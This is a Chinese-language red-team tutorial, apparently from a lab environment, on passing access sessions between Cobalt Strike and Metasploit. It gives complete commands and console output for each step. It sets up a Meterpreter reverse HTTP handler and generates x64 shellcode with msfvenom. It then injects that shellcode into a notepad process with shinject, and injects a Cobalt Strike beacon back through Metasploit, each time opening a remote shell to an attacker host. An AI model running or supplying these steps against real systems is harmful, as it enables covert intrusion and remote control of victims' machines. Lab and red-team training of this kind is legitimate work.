# Session Passing

Cobalt Strike和其他一些C2框架（如metasploit）互相传递session，这样做的好处有：

利用 Cobalt Strike 所没有的框架内的功能。
如果当前访问丢失，请使用不同的 C2 框架作为备份访问。
模拟类似的 TTP。

# Cobalt Strike->metasploit

1. 首先在metasploit起一个监听，需要使用```windows/meterpreter/reverse_http```payload (只支持x86 Meterpreter)

```
root@kali:~# msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://10.10.5.120:8080
```

2. 记住上面的IP：10.10.5.120，端口:8080

3. Cobalt Strike建立一个监听，监听的名字是：metasploit

```
In Cobalt Strike, go to Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
```

4. 传递session到msf
```
beacon> spawn metasploit
[*] Tasked beacon to spawn (x86) windows/foreign/reverse_http (10.10.5.120:8080)
```

5. msf接收到session
```
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: ofosht99) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 1 opened (10.10.5.120:8080 -> 10.10.17.231:53951)

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  DEV\bfarmer @ WKSTN-1  10.10.5.120:8080 -> 10.10.17.231:53951 (10.10.17.231)
```

# 在Cobalt Strike使用```shinject ```命令把msf的payload注入到靶机进程

1. msf生成payload（支持x64）
```
root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201308 bytes
Saved as: /tmp/msf.bin
```

2. 上传到CS的客户端所在机器，如果CS客户端也是在kali，那么这一步不是必须的
```
C:\Payloads>pscp root@kali:/tmp/msf.bin .
msf.bin                   | 196 kB | 196.6 kB/s | ETA: 00:00:00 | 100%
```

3. 注入进程，这里选择记事本（notepad.exe）
```
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 1492  4268  notepad.exe                  x64   1           DEV\bfarmer

beacon> shinject 1492 x64 C:\Payloads\msf.bin
```

4. msf收到rev shell
```
msf6 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on http://10.10.5.120:8080
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: rumczhno) Redirecting stageless connection from /N1ZSg3AJ641CWUNbIhhT5QWcTIqjJ_npAOt9u8b01bCZLPFvg0YNTQPPZpC2osS8NoHGOLaUyHHR with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: rumczhno) Attaching orphaned/stageless session...
[*] Meterpreter session 2 opened (10.10.5.120:8080 -> 10.10.17.231:53793)
```

# 从msf的session注入Cobalt Strike的payload到靶机的进程中

1. Cobalt Strike生成payload, select Raw as the Output type and select Use x64 payload
```
Attacks > Packages > Windows Executable (S)
```

2. 传到kali攻击机

3. 使用的msf的```post/windows/manage/shellcode_inject```模块，把Cobalt Strike的payload注入到进程中

```
msf6 > use post/windows/manage/shellcode_inject
msf6 post(windows/manage/shellcode_inject) > set SESSION 1
msf6 post(windows/manage/shellcode_inject) > set SHELLCODE /tmp/beacon.bin
msf6 post(windows/manage/shellcode_inject) > run

[*] Running module against WKSTN-1
[*] Spawned Notepad process 4560
[+] Successfully injected payload into process: 4560
[*] Post module execution completed
```